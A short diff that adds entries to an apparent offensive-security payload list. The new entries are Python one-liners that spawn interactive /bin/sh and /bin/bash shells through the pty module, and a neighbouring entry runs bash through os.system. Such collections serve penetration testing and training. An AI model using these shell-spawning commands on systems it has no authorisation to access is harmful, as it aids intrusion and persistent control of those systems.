@@ -212,6 +212,14 @@ payloads = [
             },
             {
                 'title': '',
+                'payload': 'python3 -c \'import pty; pty.spawn("/bin/sh")\''
+            },
+            {
+                'title': '',
+                'payload': 'python3 -c \'import pty; pty.spawn("/bin/bash")\''
+            },
+            {
+                'title': '',
                 'payload': 'echo os.system(\'/bin/bash\')'
             },
             {
